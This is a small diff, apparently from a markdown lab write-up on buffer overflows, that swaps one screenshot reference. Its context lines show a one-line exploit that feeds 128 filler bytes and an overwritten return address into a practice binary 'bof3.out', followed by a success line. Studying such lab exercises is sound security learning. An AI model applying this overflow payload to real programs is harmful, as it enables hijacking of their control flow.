@@ -75,6 +75,6 @@
 
 `echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out`
 
-![alt text](./image/image-7.png)
+![alt text](./image/image-9.png)
 
 => Seccessful
